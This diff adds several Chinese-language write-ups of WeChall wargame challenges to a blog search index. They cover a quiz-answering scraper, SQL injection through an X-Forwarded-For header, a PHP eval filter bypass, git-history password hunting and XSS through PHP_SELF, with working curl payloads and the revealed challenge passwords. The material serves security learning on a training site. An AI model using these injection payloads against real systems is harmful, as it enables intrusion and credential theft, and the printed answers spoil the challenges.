@@ -19610,4 +19610,284 @@ obscured level 9 password.</p>
         <tag>ssi</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WeChall - Trivia</title>
+    <url>/wp/WeChall/wechall-trivia/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>WeChall 自带的随机问答挑战。每次访问页面会随机显示一道选择题，需要在
+60 秒内提交正确答案。答对若干题后自动完成。</p>
+<p>题目范围覆盖计算机历史、技术术语、影视、文学、地理等类别，随机抽取。</p>
+<h3 id="solution">Solution</h3>
+<p>每道题都有一个 60
+秒的计时器，表面看需要广泛的知识储备才能通过。但挑战的题库文件意外地暴露在
+Web 上。</p>
+<h4 id="题库泄露">题库泄露</h4>
+<p>挑战页面所在的目录下有一个隐藏子目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/challenge/trivia/74k37h053/</span><br></pre></td></tr></table></figure>
+<p>目录名 <code>74k37h053</code> 是 leetspeak，指向 3
+个纯文本文件，包含了完整的问答数据库：</p>
+<table>
+<colgroup>
+<col style="width: 45%" />
+<col style="width: 5%" />
+<col style="width: 48%" />
+</colgroup>
+<thead>
+<tr>
+<th>文件</th>
+<th>题数</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>gizmore.txt</code></td>
+<td>7</td>
+<td>Gizmore 自创的冷门题</td>
+</tr>
+<tr>
+<td><code>z.txt</code></td>
+<td>116</td>
+<td>综合题库（影视/文学/历史/技术）</td>
+</tr>
+<tr>
+<td><code>InternalAffairs-Computers.txt</code></td>
+<td>59</td>
+<td>计算机/技术专项（缩写/历史/网络）</td>
+</tr>
+</tbody>
+</table>
+<p>每题的格式统一：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Category/Answer1/AlternativeAnswer//Question text?</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Acronyms-Hardware/Central Processing Unit//What does CPU stand for?</span><br><span class="line">/History-Computers/Moore&#x27;s Law/Moore//What law says that the number of transistors doubles every 18 months?</span><br><span class="line">/Technical-Networks/Tier-1 (T1)/Tier-1/T-1/T1//1.544 Mbps is the transfer rate of which common broadband technology?</span><br><span class="line">/Computers/Dmitry Sklyarov//Who was arrested at DEFCON in 2001?</span><br><span class="line">/Computers/Pretty Good Privacy//PGP is the acronym for?</span><br><span class="line">/Computers/town hall//What is the primary structure in Warcraft: Orcs &amp; Humans?</span><br><span class="line">/Celebrity/Bill Gates//Who is the most famous for getting a cake in his face?</span><br></pre></td></tr></table></figure>
+<h4 id="自动化答题">自动化答题</h4>
+<p>拿到题库后，解法就很简单了：</p>
+<ol type="1">
+<li>读取页面，提取问题文本</li>
+<li>在题库中逐条匹配，找到对应的答案</li>
+<li>在 60 秒内提交</li>
+</ol>
+<p>由于每次加载页面都会刷新 CSRF
+token，提取题目和提交需要在同一次请求中完成。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, re</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27;WC=...&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;https://www.wechall.net/challenge/trivia/index.php&#x27;</span></span><br><span class="line">qa_bank = &#123;&#125;  <span class="comment"># 从 3 个 txt 文件解析</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析题库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_qa</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(path):</span><br><span class="line">        parts = line.strip().split(<span class="string">&#x27;//&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">2</span>:</span><br><span class="line">            meta, question = parts</span><br><span class="line">            <span class="comment"># /category/answer1/answer2 → answer1</span></span><br><span class="line">            answer = meta.rsplit(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">            qa_bank[question.strip()] = answer</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一次提取 + 提交</span></span><br><span class="line">html = subprocess.run([<span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;-sL&#x27;</span>, <span class="string">&#x27;-b&#x27;</span>, cookie, url],</span><br><span class="line">    capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout</span><br><span class="line"></span><br><span class="line">question = re.search(<span class="string">r&#x27;Question:&lt;br/&gt;\s*(.*?)&lt;br/&gt;&#x27;</span>, html).group(<span class="number">1</span>)</span><br><span class="line">csrf = re.search(<span class="string">r&#x27;gwf3_csrf&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span>, html).group(<span class="number">1</span>)</span><br><span class="line">answer = qa_bank.get(question.strip())</span><br><span class="line"></span><br><span class="line">subprocess.run([<span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;-sL&#x27;</span>, <span class="string">&#x27;-b&#x27;</span>, cookie, url,</span><br><span class="line">    <span class="string">&#x27;--data-urlencode&#x27;</span>, <span class="string">f&#x27;answer=<span class="subst">&#123;answer&#125;</span>&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;--data-urlencode&#x27;</span>, <span class="string">&#x27;cmd=Answer&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;--data-urlencode&#x27;</span>, <span class="string">f&#x27;gwf3_csrf=<span class="subst">&#123;csrf&#125;</span>&#x27;</span>],</span><br><span class="line">    capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>答对约 10-15 道不同的题后，页面显示 "already solved"，挑战完成。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>research</tag>
+        <tag>fun</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - The Guestbook</title>
+    <url>/wp/WeChall/wechall-the-guestbook/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>一个带源码的 guestbook 挑战。页面会把留言、session id、时间和访问者
+IP 写入数据库；目标是找到 Admin 的密码。</p>
+<p>关键点不在留言内容，而在 IP 来源：程序信任
+<code>X-Forwarded-For</code>，并把它当作字符串直接拼进
+<code>INSERT</code>。</p>
+<h3 id="solution">Solution</h3>
+<p>源码里的 IP 获取逻辑大致是：优先读取
+<code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>，否则才使用真实远端地址。随后写入
+guestbook：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> gbook_book <span class="keyword">VALUES</span>(<span class="string">&#x27;$sessid&#x27;</span>, <span class="number">0</span>, $<span class="type">time</span>, <span class="string">&#x27;$ip&#x27;</span>, <span class="string">&#x27;$message&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><code>$message</code> 会被正常处理，但 <code>$ip</code>
+没有转义。因为 <code>$ip</code> 被包在单引号里，可以用
+<code>X-Forwarded-For</code> 关闭当前字符串，再补齐后面的
+<code>VALUES</code> 字段。</p>
+<p>先构造一个不依赖盲注的 payload：把 Admin 密码查出来，直接写到
+guestbook 的 message 字段里。</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x27;, (SELECT gbu_password FROM gbook_user WHERE gbu_name=&#x27;Admin&#x27;))#</span><br></pre></td></tr></table></figure>
+<p>代入后 SQL 变成：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> gbook_book <span class="keyword">VALUES</span>(</span><br><span class="line">  <span class="string">&#x27;$sessid&#x27;</span>,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  $<span class="type">time</span>,</span><br><span class="line">  <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  (<span class="keyword">SELECT</span> gbu_password <span class="keyword">FROM</span> gbook_user <span class="keyword">WHERE</span> gbu_name<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span>))#<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;</span>$message<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+<p><code>#</code> 注释掉原本剩下的
+<code>', '$message')</code>，于是子查询结果会作为留言内容落库。</p>
+<p>实际提交时需要带登录 cookie，并先从页面取当前 CSRF token：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Forwarded-For: 127.0.0.1&#x27;,(SELECT gbu_password FROM gbook_user WHERE gbu_name=&#x27;Admin&#x27;))#&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;message=test&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;sign=Sign Guestbook&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;gwf3_csrf=TOKEN&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/guestbook/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>再刷新 guestbook，刚插入的记录会显示 Admin 密码。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">TheBrownFoxAndTheLazyDog</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>wechall</tag>
+        <tag>sqli</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - PHP 0819</title>
+    <url>/wp/WeChall/wechall-php-0819/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>space 的 PHP eval 小挑战。目标是在 13
+字节以内构造一个表达式，让执行后的 <code>$spaceone</code> 严格等于字符串
+<code>1337</code>。</p>
+<p>页面给出完整源码，核心逻辑是读取 GET 参数
+<code>eval</code>，删除一批字符，限制长度，然后拼进
+<code>eval()</code>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title class_">Common</span>::<span class="title function_ invoke__">getGetString</span>(<span class="string">&#x27;eval&#x27;</span>);</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>) &gt; <span class="number">13</span>) || (<span class="literal">false</span> !== <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;return&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;sorry, not allowed!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$spaceone = <span class="subst">$f</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$spaceone</span> === <span class="string">&#x27;1337&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>最后是 strict comparison，所以直接提交 <code>1337</code> 不行：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$spaceone</span> = <span class="number">1337</span>;</span><br></pre></td></tr></table></figure>
+<p>这样得到的是 integer <code>1337</code>，不是 string
+<code>"1337"</code>。</p>
+<h3 id="solution">Solution</h3>
+<p>约束很紧：</p>
+<ul>
+<li>引号 <code>"</code> / <code>'</code>
+会被删除，不能直接写字符串。</li>
+<li><code>$</code> 会被删除，不能引用变量。</li>
+<li><code>.</code> 会被删除，不能拼接字符串。</li>
+<li><code>(</code> / <code>)</code> 会被删除，基本不能调用函数。</li>
+<li><code>&gt;</code> 会被删除，但 <code>&lt;</code> 没有被删。</li>
+<li>长度最多 13 字节，且不能包含 <code>return</code>。</li>
+</ul>
+<p>问题变成：PHP 有没有不需要引号的字符串字面量？答案是 heredoc。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">1337</span></span><br><span class="line"><span class="string">a</span>;</span><br></pre></td></tr></table></figure>
+<p>这里用一字符标识符 <code>a</code>，字节数刚好卡进限制：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;a\n1337\na;\n</span><br><span class="line">4 + 1 + 4 + 1 + 2 + 1 = 13</span><br></pre></td></tr></table></figure>
+<p>payload 只用到
+<code>&lt;</code>、字母、数字、分号和换行，都不会被过滤。进入
+<code>eval()</code> 后等价于：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$spaceone</span> = <span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">1337</span></span><br><span class="line"><span class="string">a</span>;</span><br></pre></td></tr></table></figure>
+<p>heredoc 表达式的值是字符串 <code>"1337"</code>，因此能通过
+<code>$spaceone === '1337'</code>。</p>
+<p>用 curl 提交时让 <code>--data-urlencode</code> 处理换行，避免手写
+<code>%0A</code> 出错：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -sL -G \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  --data-urlencode $<span class="string">&#x27;eval=&lt;&lt;&lt;a\n1337\na;\n&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/space/php0819/index.php&#x27;</span> \</span><br><span class="line">  | grep -o <span class="string">&#x27;Your answer is correct&#x27;</span></span><br><span class="line">Your answer is correct</span><br></pre></td></tr></table></figure>
+<p>等价的 URL 参数是：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">eval=%3C%3C%3Ca%0A1337%0Aa%3B%0A</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>php</tag>
+        <tag>exploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Repeating History</title>
+    <url>/wp/WeChall/wechall-repeating-history/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>This challenge is about researching the GWF3 codebase. I have put 2
+passwords somewhere, but .... The first password is obvious and the
+second is very subversive. Both are near. Combine them without any
+separator.</p>
+</blockquote>
+<p>需要研究 WeChall 的 GWF3 框架源码，找到两个隐藏的密码。</p>
+<h3 id="solution">Solution</h3>
+<p>GWF3 源码在 GitHub：<code>gizmore/gwf3</code></p>
+<p><strong>第一个密码</strong>（"obvious"）：</p>
+<p>在
+<code>www/challenge/subversive/repeating/what_do_you_want_here.php</code>
+中，PHP 注释里藏着密码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*InDaxIn*/</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>页面源码显示空引号，但查看原始 HTML 可以看到注释中的
+<code>InDaxIn</code>。</p>
+<p><strong>第二个密码</strong>（"very subversive"）：</p>
+<p>在 <code>www/challenge/subversive/history/install.php</code> 的 git
+历史中。当前版本：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$solution</span> = <span class="string">&#x27;2bda2998d9b0ee197da142a0447f6725&#x27;</span>;  <span class="comment">// MD5(&quot;wrong&quot;) — 红鲱鱼！</span></span><br></pre></td></tr></table></figure>
+<p>通过 <code>git log</code> 查看历史提交，原始密码是
+<code>NothingHereMoveAlong</code>，后来被替换成了 MD5("wrong")
+的哈希。</p>
+<p>这就是为什么挑战叫 "Repeating History" —— 你必须重复/回溯 git
+历史才能找到原始密码。</p>
+<p><strong>组合答案</strong>：<code>InDaxIn</code> +
+<code>NothingHereMoveAlong</code>（无分隔符）</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">InDaxInNothingHereMoveAlong</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>research</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Yourself PHP</title>
+    <url>/wp/WeChall/wechall-yourself-php/</url>
+    <content><![CDATA[<blockquote>
+<p>Your mission is to inject alert(1); into this script, and make it
+popup a javascript alert.</p>
+<p>目标是在页面里注入
+<code>alert(1);</code>。现在这题不再依赖浏览器真实弹窗，而是检查 payload
+后静默修补输出并判定结果。</p>
+</blockquote>
+<h3 id="challenge">Challenge</h3>
+<p>题目给了源码入口：<code>index.php?highlight=christmas</code>。页面上有一个
+<code>username</code> 表单，直觉上像是要在用户名字段里做 XSS，但源码对
+<code>username</code> 做了 <code>htmlspecialchars()</code>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title class_">GWF_Box</span>::<span class="title function_ invoke__">box</span>(<span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">        <span class="string">&quot;Well done %s, you entered your username. But this is &lt;b&gt;not&lt;/b&gt; what you need to do.&quot;</span>,</span><br><span class="line">        <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title class_">Common</span>::<span class="title function_ invoke__">getPostString</span>(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以 <code>username</code> 只是诱饵。题名是 Yourself
+PHP，真正要看的点是 <code>$_SERVER['PHP_SELF']</code>。</p>
+<h3 id="solution">Solution</h3>
+<p>关键代码在表单输出这里：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box box_c&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;form action=&quot;%s&quot; method=&quot;post&quot;&gt;&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;div&gt;%s&lt;/div&gt;&#x27;</span>, GWF_CSRF::<span class="title function_ invoke__">hiddenForm</span>(<span class="string">&#x27;phpself&#x27;</span>)).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;div&gt;Username:&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;/div&gt;&#x27;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;div&gt;&lt;input type=&quot;submit&quot; name=&quot;deadcode&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&#x27;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;/form&gt;&#x27;</span>).PHP_EOL;</span><br></pre></td></tr></table></figure>
+<p><code>$_SERVER['PHP_SELF']</code> 被直接塞进 HTML attribute：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;...&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>普通访问时，<code>PHP_SELF</code> 只是脚本路径：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/challenge/yourself_php/index.php</span><br></pre></td></tr></table></figure>
+<p>但 PHP / Web server 通常会把 <code>index.php</code> 后面的 path info
+也放进 <code>PHP_SELF</code>。访问下面这种路径时：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/challenge/yourself_php/index.php/anything</span><br></pre></td></tr></table></figure>
+<p>模板里的 <code>%s</code> 会变成：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/challenge/yourself_php/index.php/anything&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>于是攻击面不在 POST body，而在 URL path info。只要让 path info 先闭合
+<code>action</code> 的双引号，再闭合 <code>&lt;form&gt;</code>
+起始标签，就能插入脚本节点：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>拼回模板后，旧版漏洞会生成类似这样的 HTML：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/challenge/yourself_php/index.php/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot; method=&quot;post&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>浏览器解析时：</p>
+<ol type="1">
+<li><code>"</code> 结束 <code>action</code> 属性。</li>
+<li><code>&gt;</code> 结束 <code>&lt;form&gt;</code> 起始标签。</li>
+<li><code>&lt;script&gt;alert(1);&lt;/script&gt;</code>
+成为真正的脚本节点。</li>
+<li>后面的 <code>" method="post"&gt;</code> 只是残留文本，不影响前面的
+script 执行。</li>
+</ol>
+<p>当前 WeChall 源码已经在检查后静默修补了这个输入，注释里写的是：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check your injection and fix the hole by silently applying htmlsepcialchars to the vuln input.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">phpself_checkit</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">onChallengeSolved</span>(<span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getUserID</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的 <code>htmlsepcialchars</code>
+是源码注释里的原拼写。也就是说，现在的题目更像 simulated
+challenge：<code>phpself_checkit()</code> 检查静态
+payload，命中后判定正确；不需要真的让当前页面弹窗。</p>
+<p>实际访问时用 URL-encoded payload，避免 shell、URL 和 HTML 对
+<code>&lt;</code>、<code>&gt;</code>、<code>"</code> 的处理差异：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -sL \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/yourself_php/index.php/%22%3E%3Cscript%3Ealert(1);%3C/script%3E&#x27;</span> \</span><br><span class="line">  | grep -o <span class="string">&#x27;Your answer is correct&#x27;</span></span><br><span class="line">Your answer is correct</span><br></pre></td></tr></table></figure>
+<p>如果带登录态访问同一个 URL，命中后会把挑战记到当前账号；最终以
+<code>/en/challs</code> 里 <code>Yourself PHP</code> 的
+<code>wc_chall_solved_1</code> 为准。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>xss</tag>
+        <tag>wechall</tag>
+        <tag>php</tag>
+        <tag>exploit</tag>
+      </tags>
+  </entry>
 </search>
